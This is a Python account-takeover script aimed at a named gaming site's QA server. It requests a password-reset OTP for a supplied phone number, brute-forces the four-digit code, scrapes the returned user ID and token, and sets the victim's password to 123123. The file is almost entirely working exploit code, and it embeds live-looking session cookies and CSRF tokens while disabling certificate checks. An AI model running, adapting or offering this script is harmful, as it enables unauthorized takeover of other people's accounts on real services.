import requests, sys
from bs4 import BeautifulSoup
from urllib3.exceptions import InsecureRequestWarning

def pass_brute(otp):
    session = requests.Session()
    URL = 'https://qa.game-on.io/resetverify'
    # http_proxy = {
    #     'http': '127.0.0.1:8080',
    #     'https': '127.0.0.1:8080'
    # }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
        'Cookie': '_ga=GA1.2.1846406014.1598247358; _gid=GA1.2.394578595.1598247358; XSRF-TOKEN=eyJpdiI6Ik1HSURDYnpKYTlGSWMwVTBVS2FXdkE9PSIsInZhbHVlIjoia2ZPNkJ5NWlUcXN5T1MvMG1sMzlhMFZNbUI0TWxQZWZMcFFZL21VN0UxcFRvdUg5T1E0aDJZMjZCZk1hUENPMHE5QWd1NlMvcTk4TkdvczI5WWg4S2U0Nll1WmdVQ0NqeG41RlRsYlFNcHNqaFpFeGM2MWhtQXl5MVkvWEIvTGUiLCJtYWMiOiIzMWM3MGY0MzUxYjI1OTQxZjlhYTc2NTRiMjU2MzAyNjIzMzM2ZWUzOWNjN2M5YWMzN2IzYjE1ZjU0OTZiNGZhIn0%3D; gameon_session=eyJpdiI6IjAzT3hqZU4wR0hXbm9vNTlPOW42YVE9PSIsInZhbHVlIjoiSk9SSHVHRy9jRzhnNWpHZUxBczBMdzB2cmtVY1hGSENKZ2M4cEpxQ1hPeUdPMmxVK3M3dVUrakdwZ2JsdUZ6NjdndnYzTG1wWUdyMGtwSVhIWUxIckZ4c3dNT2ljQm1lVGp3TDdManZwK09tM0x5bnBuZGg2OXlKdUczb25VVlIiLCJtYWMiOiJlZmRhN2I3YmYwNjIyZjkyZTAyODhjMTVhODE0ZmQyOWRjMTRlNzZjODA4MDA0OGVmYzM2Nzk3ZjYzODM5Y2E5In0%3D',
    }
    payload = {
        '_token': 'HnATZhYUKW44vGFYTN4AtxTbOedcGbiVpN4IzA3H',
        'code1': str(otp)[0:1],
        'code2': str(otp)[1:2],
        'code3': str(otp)[2:3],
        'code4': str(otp)[3:4],
    }
    #requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)  
    response = session.post(url=URL, data=payload, 
            verify=False, headers=headers)
    return response

def reset_pass(number):
    session = requests.Session()
    URL = 'https://qa.game-on.io/reset-password'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
        'Cookie': '_ga=GA1.2.1846406014.1598247358; _gid=GA1.2.394578595.1598247358; XSRF-TOKEN=eyJpdiI6Ik1HSURDYnpKYTlGSWMwVTBVS2FXdkE9PSIsInZhbHVlIjoia2ZPNkJ5NWlUcXN5T1MvMG1sMzlhMFZNbUI0TWxQZWZMcFFZL21VN0UxcFRvdUg5T1E0aDJZMjZCZk1hUENPMHE5QWd1NlMvcTk4TkdvczI5WWg4S2U0Nll1WmdVQ0NqeG41RlRsYlFNcHNqaFpFeGM2MWhtQXl5MVkvWEIvTGUiLCJtYWMiOiIzMWM3MGY0MzUxYjI1OTQxZjlhYTc2NTRiMjU2MzAyNjIzMzM2ZWUzOWNjN2M5YWMzN2IzYjE1ZjU0OTZiNGZhIn0%3D; gameon_session=eyJpdiI6IjAzT3hqZU4wR0hXbm9vNTlPOW42YVE9PSIsInZhbHVlIjoiSk9SSHVHRy9jRzhnNWpHZUxBczBMdzB2cmtVY1hGSENKZ2M4cEpxQ1hPeUdPMmxVK3M3dVUrakdwZ2JsdUZ6NjdndnYzTG1wWUdyMGtwSVhIWUxIckZ4c3dNT2ljQm1lVGp3TDdManZwK09tM0x5bnBuZGg2OXlKdUczb25VVlIiLCJtYWMiOiJlZmRhN2I3YmYwNjIyZjkyZTAyODhjMTVhODE0ZmQyOWRjMTRlNzZjODA4MDA0OGVmYzM2Nzk3ZjYzODM5Y2E5In0%3D',
    }
    payload = {
        '_token': 'HnATZhYUKW44vGFYTN4AtxTbOedcGbiVpN4IzA3H',
        'username': number
    }
    #requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    response = session.post(url=URL, data=payload,
            verify=False, headers=headers)
    if response.status_code == 200:
        return True
    else:
        return False


def set_newpass(userid, token):
    URL = 'https://qa.game-on.io/new-password'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36',
        'Cookie': '_ga=GA1.2.1846406014.1598247358; _gid=GA1.2.394578595.1598247358; XSRF-TOKEN=eyJpdiI6Ik1HSURDYnpKYTlGSWMwVTBVS2FXdkE9PSIsInZhbHVlIjoia2ZPNkJ5NWlUcXN5T1MvMG1sMzlhMFZNbUI0TWxQZWZMcFFZL21VN0UxcFRvdUg5T1E0aDJZMjZCZk1hUENPMHE5QWd1NlMvcTk4TkdvczI5WWg4S2U0Nll1WmdVQ0NqeG41RlRsYlFNcHNqaFpFeGM2MWhtQXl5MVkvWEIvTGUiLCJtYWMiOiIzMWM3MGY0MzUxYjI1OTQxZjlhYTc2NTRiMjU2MzAyNjIzMzM2ZWUzOWNjN2M5YWMzN2IzYjE1ZjU0OTZiNGZhIn0%3D; gameon_session=eyJpdiI6IjAzT3hqZU4wR0hXbm9vNTlPOW42YVE9PSIsInZhbHVlIjoiSk9SSHVHRy9jRzhnNWpHZUxBczBMdzB2cmtVY1hGSENKZ2M4cEpxQ1hPeUdPMmxVK3M3dVUrakdwZ2JsdUZ6NjdndnYzTG1wWUdyMGtwSVhIWUxIckZ4c3dNT2ljQm1lVGp3TDdManZwK09tM0x5bnBuZGg2OXlKdUczb25VVlIiLCJtYWMiOiJlZmRhN2I3YmYwNjIyZjkyZTAyODhjMTVhODE0ZmQyOWRjMTRlNzZjODA4MDA0OGVmYzM2Nzk3ZjYzODM5Y2E5In0%3D',
    }
    payload = {
        '_token': token,
        'userid': userid,
        'password': 123123,
        'password_confirmation': 123123
    }
    #requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
    response = requests.post(url=URL, data=payload,
                            verify=False, headers=headers)
    if response.status_code == 200:
        print('[+] Password has changed successfully. New pass: 123123')

def get_value(sesion, name):
    soup = BeautifulSoup(sesion, 'html.parser')
    inputid = soup.find("input", {'name': name})
    return inputid['value']

def magic():
    for otp in range(1111, 9999):
        response = pass_brute(otp)
        response_code = response.status_code
        # print('[-] OTP: ', otp, ' response : ',
        #       response_code, 'url : ', response.url)
        if response.url == 'https://qa.game-on.io/new-password':
            print("[+] OTP Found! : ", otp)
            print("[+] Getting input values...")
            userid = get_value(response.content, 'userid')
            token = get_value(response.content, '_token')
            print("[+] Setting new password ...")
            set_newpass(userid, token)
            break

if __name__ == '__main__':
    if sys.argv[1]:
        print("[+] Trying to send OTP.")
        if(reset_pass(sys.argv[1])):
            print("[+] Sending OTP successfull to ", sys.argv[1])
            print("[+] Time to account takeover. It will take less than 5 minutes.")
            magic()
    else:
        print('Please pass an arugemnt!')
